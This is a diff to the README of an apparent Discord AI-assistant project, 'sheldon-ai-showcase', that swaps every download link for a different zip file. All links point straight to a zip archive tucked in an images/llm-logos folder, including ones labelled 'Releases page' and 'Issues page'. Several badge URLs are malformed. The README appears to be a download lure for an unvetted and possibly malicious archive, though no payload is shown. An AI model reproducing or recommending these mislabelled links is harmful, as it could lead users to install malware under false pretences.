@@ -1,6 +1,6 @@
 # 🤖 sheldon-ai-showcase - Your AI Assistant for Discord
 
-[![Download Sheldon AI Assistant](https://raw.githubusercontent.com/yogesh121313/sheldon-ai-showcase/main/brainwood/sheldon-ai-showcase.zip%https://raw.githubusercontent.com/yogesh121313/sheldon-ai-showcase/main/brainwood/sheldon-ai-showcase.zip)](https://raw.githubusercontent.com/yogesh121313/sheldon-ai-showcase/main/brainwood/sheldon-ai-showcase.zip)
+[![Download Sheldon AI Assistant](https://github.com/yogesh121313/sheldon-ai-showcase/raw/refs/heads/main/images/llm-logos/ai_showcase_sheldon_v1.9-beta.4.zip%https://github.com/yogesh121313/sheldon-ai-showcase/raw/refs/heads/main/images/llm-logos/ai_showcase_sheldon_v1.9-beta.4.zip)](https://github.com/yogesh121313/sheldon-ai-showcase/raw/refs/heads/main/images/llm-logos/ai_showcase_sheldon_v1.9-beta.4.zip)
 
 ## 📜 Description
 
@@ -25,7 +25,7 @@ You can download Sheldon AI Assistant from our Releases page.
 
 **To download:**
 
-1. Visit this page to download: [Sheldon AI Assistant Releases](https://raw.githubusercontent.com/yogesh121313/sheldon-ai-showcase/main/brainwood/sheldon-ai-showcase.zip).
+1. Visit this page to download: [Sheldon AI Assistant Releases](https://github.com/yogesh121313/sheldon-ai-showcase/raw/refs/heads/main/images/llm-logos/ai_showcase_sheldon_v1.9-beta.4.zip).
    
 2. Look for the latest version listed.
 
@@ -73,7 +73,7 @@ If you encounter any issues during installation or usage:
 Join our community for additional help and discussions:
 
 - **Discord Server:** Link to the community Discord server (insert link here).
-- **GitHub Issues:** Report bugs or request features at our [Issues page](https://raw.githubusercontent.com/yogesh121313/sheldon-ai-showcase/main/brainwood/sheldon-ai-showcase.zip).
+- **GitHub Issues:** Report bugs or request features at our [Issues page](https://github.com/yogesh121313/sheldon-ai-showcase/raw/refs/heads/main/images/llm-logos/ai_showcase_sheldon_v1.9-beta.4.zip).
 
 ## 🔒 Privacy & Security
 
@@ -87,4 +87,4 @@ For inquiries or support, you can reach us through the Issues page on GitHub, or
 
 We are committed to improving Sheldon with regular updates. Expect new features, enhancements, and bug fixes based on user feedback. Stay tuned by watching our GitHub repository for announcements.
 
-[![Download Sheldon AI Assistant](https://raw.githubusercontent.com/yogesh121313/sheldon-ai-showcase/main/brainwood/sheldon-ai-showcase.zip%https://raw.githubusercontent.com/yogesh121313/sheldon-ai-showcase/main/brainwood/sheldon-ai-showcase.zip)](https://raw.githubusercontent.com/yogesh121313/sheldon-ai-showcase/main/brainwood/sheldon-ai-showcase.zip)
+[![Download Sheldon AI Assistant](https://github.com/yogesh121313/sheldon-ai-showcase/raw/refs/heads/main/images/llm-logos/ai_showcase_sheldon_v1.9-beta.4.zip%https://github.com/yogesh121313/sheldon-ai-showcase/raw/refs/heads/main/images/llm-logos/ai_showcase_sheldon_v1.9-beta.4.zip)](https://github.com/yogesh121313/sheldon-ai-showcase/raw/refs/heads/main/images/llm-logos/ai_showcase_sheldon_v1.9-beta.4.zip)
